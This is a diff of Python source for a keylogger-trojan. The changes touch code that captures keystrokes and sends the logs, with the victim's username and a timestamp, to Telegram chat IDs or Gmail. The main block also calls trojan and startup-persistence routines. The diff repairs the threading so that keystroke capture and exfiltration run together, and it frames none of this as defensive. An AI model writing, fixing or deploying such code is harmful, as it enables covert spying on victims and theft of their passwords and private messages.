@@ -211,10 +211,10 @@ class Util:
                 "%I") + ":" + T.strftime("%M") + " " + T.strftime("%p")
             def SendT(ID):
                 bot = telebot.TeleBot(Config.TelegramBot().TOKEN)  # Instancia
-                bot.send_message(ID,"Usuario: " + str(getuser()) + "\nFecha: " + currentTime + "\n=>\n=>\n" + f.read())
+                bot.send_message(ID,"User: " + str(getuser()) + "\nDate: " + currentTime + "\n\r\n\r\n\r\n" + f.read())
                 print("[TelegramBot] Se obtuvo el registro de teclas y se envió a Telegram [ID] =" + str(ID))
             try:
-                if Config.TelegramBot().ID_2 != 000000000:
+                if Config.TelegramBot().ID != 000000000:
                     SendT(Config.TelegramBot().ID)
 
                 if Config.TelegramBot().ID_2 != 000000000:
@@ -289,10 +289,12 @@ class Util:
 class Send:
     def __init__(self):
         pass
-    def SendLog(self):
-        while(True):
+    def Log(self):
+        print("[SendLog] Active...")
+        while True:
+            print("[SendLog] El tiempo de espera es: " +str(Config().TIMESEND * 60))
             #time.sleep(Config().TIMESEND * 60)  # Tiempo de espera por minutos
-            time.sleep(4) # Solo antigueeo
+            time.sleep(10) # Solo antigueeo
             if Functions().VerifyConnection():
                 if Config().MODE == 0:
                     Util().SendGmail()
@@ -503,8 +505,10 @@ if __name__ == '__main__':
     Util().Trojan()
     Util().addStartUp()
 
-    p1 = threading.Thread(target=Keylogger().GetKeys())  # Registra teclas
-    p2 = threading.Thread(target=Send().SendLog())  # Enviar Registro
+    p1 = threading.Thread(target=Keylogger().GetKeys)  # Enviar Registro
+
+    p2 = threading.Thread(target=Send().Log)  # Registra teclas
+
     p2.start()
     p1.start()
     p1.join()
